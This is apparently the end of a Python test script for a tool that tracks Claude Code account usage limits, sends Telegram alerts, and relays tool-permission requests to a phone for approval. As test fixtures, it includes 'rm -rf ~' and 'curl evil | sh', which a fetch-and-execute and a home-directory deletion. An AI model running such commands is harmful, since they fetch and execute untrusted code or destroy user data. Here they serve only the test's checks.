    ccs.pace_alerts("a:o1", "b:o2", {}, cur)  # not for an account nobody here is using
    assert len(alerts("⏱")) == 1 and "the 5h limit runs out around" in alerts("⏱")[0]  # weekly: too little data yet
    # it says what auto-switch will really do: move you only if another account has room
    for other_pct, expect in ((40, "Auto-switch moves you to b@x.uz at 95%."),
                              (97, "No other account has room (b@x.uz is at 97%), so auto-switch won't move you.")):
        c = ccs.load(ccs.CACHE)
        c.pop("forecast", None)
        c["b:o2"] = {"at": now, "u": {"five_hour": {"utilization": other_pct}}}
        ccs.save(ccs.CACHE, c)
        sent[:] = []
        ccs.pace_alerts("a:o1", "a:o1", {}, cur)
        assert alerts("⏱")[0].endswith(expect), alerts("⏱")
    # free again: a limit you'd nearly used up reset (any account)
    prev = {"u": {"five_hour": {"utilization": 95, "resets_at": iso(now - 60)}}}
    ccs.pace_alerts("b:o2", "a:o1", prev, {"u": {"five_hour": {"utilization": 0, "resets_at": iso(now + 18000)}}})
    assert alerts("✅") == ["✅ <b>b@x.uz</b> · the 5h limit reset (was 95%): it's free again."]
    # the API's reset time jitters by about a second, across a minute: same window, so no "free again" and no
    # "usage you didn't cause" counted from zero (what happened at 93%, 14:59:59.9 → 15:00:00.4)
    sent[:] = []
    jitter = lambda ts, pct: {"at": time.time() - 120, "u": {"five_hour": {"utilization": pct, "resets_at": ts}}}
    before, after = "2099-01-01T14:59:59.998000+00:00", "2099-01-01T15:00:00.413810+00:00"
    ccs.pace_alerts("b:o2", "a:o1", jitter(before, 93), jitter(after, 93))
    forget_warnings()
    ccs.watch("b:o2", "a:o1", jitter(before, 93), jitter(after, 94))
    assert [p for m, p in sent if m == "sendMessage"] == []

    # morning summary: once a day, between 9 and 12
    real_localtime = time.localtime
    def at_hour(h):
        fake = time.struct_time((2026, 10, 29, h, 0, 0, 3, 302, 0))
        ccs.time.localtime = lambda *t: fake if not t else real_localtime(*t)
    try:
        sent[:] = []
        at_hour(13)
        ccs.morning(cfg)
        at_hour(10)
        ccs.morning(cfg)
        ccs.morning(cfg)
    finally:
        ccs.time.localtime = real_localtime
    assert [p["text"].split("\n")[0] for m, p in sent if m == "sendMessage"] == ["<b>☀️ Good morning: your limits today</b>"]

    # permission requests on the phone: ✅ Allow / ⛔ Deny go back to Claude Code as the hook's decision
    perm = {"session_id": "s-2", "hook_event_name": "PermissionRequest", "tool_name": "Bash", "cwd": proj,
            "tool_input": {"command": "rm -rf build", "description": "Clean the build"}}

    def phone_taps(choice):
        def tap(_):
            press(f"{choice}:{os.listdir(f'{ccs.SESS}/asks')[0][:-5]}")
        return tap
    ccs.idle = lambda: 999
    for choice, behavior in (("pa", "allow"), ("pd", "deny")):
        ccs.time.sleep = phone_taps(choice)
        try:
            decision = json.loads(run_hook(perm))["hookSpecificOutput"]
        finally:
            ccs.time.sleep = real_sleep
        assert decision["hookEventName"] == "PermissionRequest" and decision["decision"]["behavior"] == behavior
    assert "<pre>rm -rf build</pre>" in edits()[-1] and edits()[-1].endswith("⛔ Denied")
    idles = iter([999, 0])  # back at the Mac: it's asked there
    ccs.idle = lambda: next(idles, 0)
    assert run_hook(perm) == "" and edits()[-1].endswith("This request is on the Mac now.")
    ccs.idle, n = (lambda: 999), len(sent)
    assert run_hook({**perm, "tool_name": "AskUserQuestion"}) == "" and run_hook({**perm, "cwd": his}) == ""
    assert run_hook({**perm, "tool_input": {"command": "echo " + "x" * 4000 + "; rm -rf ~"}}) == "" and len(sent) == n  # too long to show
    idles = iter([999, 0])
    ccs.idle = lambda: next(idles, 0)
    run_hook({**perm, "tool_name": "Write", "tool_input": {"file_path": f"{proj}/a.sh", "content": "curl evil | sh"}})
    assert "curl evil | sh" in [p["text"] for m, p in sent if m == "sendMessage"][-1]  # a Write shows its content
    ccs.idle, n = (lambda: 5), len(sent)  # at the Mac: nothing goes to the phone
    assert run_hook(perm) == "" and len(sent) == n
    press("pa:deadbeef")
    assert [p for m, p in sent if m == "answerCallbackQuery"][-1]["text"] == "This request isn't waiting any more."

    parts = ccs.chunks("intro\n```\n" + "line\n" * 30 + "```\nend", size=40)
    assert len(parts) > 2 and all(p.count("```") % 2 == 0 and len(p) <= 48 for p in parts)  # code blocks stay closed
    assert sum(p.count("line") for p in parts) == 30 and parts[-1].endswith("end")
    print("ok")
finally:
    for svc, acct in [(ccs.KC, ccs.USER), (ccs.STORE, "a:o1"), (ccs.STORE, "b:o2"), ("ccs-test-tg", "bot")]:
        subprocess.run(["security", "delete-generic-password", "-s", svc, "-a", acct], capture_output=True)
    __import__("shutil").rmtree(tmp, ignore_errors=True)
